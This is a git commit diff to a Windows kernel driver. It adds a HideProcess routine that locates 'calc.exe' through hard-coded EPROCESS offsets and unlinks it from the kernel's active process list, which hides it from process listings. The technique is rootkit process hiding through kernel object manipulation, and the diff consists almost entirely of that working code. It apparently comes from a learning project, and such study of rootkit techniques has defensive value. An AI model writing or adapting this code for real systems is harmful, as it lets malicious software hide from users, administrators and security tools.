159d29d1b73e7ada5df29790ef81b945d4aba52c
Sofiane Zouaoui <41506121+Sosso8305@users.noreply.github.com>
2023-01-28 21:26:34 +0100

    add: hideProcess(calc.exe)

--- kernel/driver.c
+++ kernel/driver.c
@@ -1,34 +1,66 @@
 #include <ntifs.h>
 #include <ntddk.h>
+#include <string.h>
+
 
 #define DeviceName L"\\Device\\driver"
 #define LnkDeviceName L"\\DosDevices\\driver" 
 
 
 void HideProcess(){
+	PEPROCESS pEProcBefore;
 	PEPROCESS pEProc;
 	PEPROCESS pEProcFirst;
 	PEPROCESS pEProcNext;
-	int offset = 0x16c;
+	int offset_name = 0x16c;
 	int offset_lEntry = 0x0b8;
 	char * name;
 	char * hide_proc = "calc.exe";
 	int guard;
 	int flag_first;
 	LIST_ENTRY * list_entry=NULL;
+	LIST_ENTRY * list_entry_temp;
+	int findProc;
+
 	
+	findProc = 1;
 	pEProcFirst = IoGetCurrentProcess();
 	pEProc = NULL;
 	pEProcNext= pEProcFirst;
 	
+
 	guard =0;
 	flag_first = 0;
 	while(guard<100 && (pEProcFirst != pEProcNext || !flag_first) ){
 		pEProc = pEProcNext;
 	
-		name = (PUCHAR) pEProc + offset;
-		DbgPrint("name: %s\n",name);
-	
+		name = (PUCHAR) pEProc + offset_name;
+		//DbgPrint("name: %s\n",name);
+
+		findProc = strcmp(name,hide_proc);
+		if(!findProc){
+			DbgPrint("Initialize unlink process: %s\n",name);
+
+			//catch eEProcBefore & eEProcNext
+			list_entry= (LIST_ENTRY*)((PUCHAR) pEProc + offset_lEntry);
+			pEProcNext = (PEPROCESS)((PUCHAR) list_entry->Flink - offset_lEntry);
+			pEProcBefore = (PEPROCESS)((PUCHAR) list_entry->Blink - offset_lEntry);
+			
+			//unlink
+			list_entry_temp = (LIST_ENTRY*)((PUCHAR) pEProc + offset_lEntry);
+			
+			list_entry = (LIST_ENTRY*)((PUCHAR) pEProcBefore + offset_lEntry);
+			list_entry->Flink = list_entry_temp->Flink;
+
+			list_entry = (LIST_ENTRY*)((PUCHAR) pEProcNext + offset_lEntry);
+			list_entry->Blink = list_entry_temp->Blink;
+
+			DbgPrint("Finish unlink process: %s\n",name);
+
+			break;
+			//findProc = 1; when try to sneak more than one process, it will work but we have blue screen after few seconds when driver uninstall
+		}
+
 	
 		list_entry= (LIST_ENTRY*)((PUCHAR) pEProc + offset_lEntry);
 	
